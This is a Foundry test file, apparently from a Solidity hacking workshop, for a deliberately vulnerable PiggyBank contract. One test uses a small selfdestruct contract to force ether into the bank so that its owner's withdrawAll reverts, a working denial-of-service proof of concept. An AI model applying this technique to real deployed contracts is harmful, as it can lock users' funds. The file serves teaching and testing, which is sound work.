//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "hack-workshop/SolidityHackingWorkshopV8.sol";

contract SuicideTo {
    address target;

    constructor(address _target) payable {
        target = _target;
    }

    function Suicide() public {
        selfdestruct(payable(target));
    }
}

contract PiggyBankTest is Test {
    PiggyBank bank;
    address alice;

    function setUp() public {
        alice = address(7777);
        payable(alice).transfer(10 ether);
        vm.prank(alice);
        bank = new PiggyBank();
    }

    function testDepositAndWithdraw() public {
        vm.startPrank(alice);
        bank.deposit{value: 1 ether}();
        assertEq(address(bank).balance, 1 ether);

        for (uint8 i = 0; i < 9; ++i) {
            bank.deposit{value: 1 ether}();
        }
        assertEq(address(bank).balance, 10 ether);
        bank.withdrawAll();
        assertEq(address(bank).balance, 0);
    }

    function testSelfDestructPreventingWithdraw() public {
        vm.startPrank(alice);
        for (uint8 i = 0; i < 10; ++i) bank.deposit{value: 1 ether}();
        assertEq(address(bank).balance, 10 ether);
        vm.stopPrank();

        // self destruct of hacker will sent ether to piggyu bank
        // and made it's balance exceed 10 ether.
        SuicideTo hacker = new SuicideTo{value: 1000}(address(bank));
        hacker.Suicide();
        vm.prank(alice);
        vm.expectRevert();
        bank.withdrawAll();
    }
}
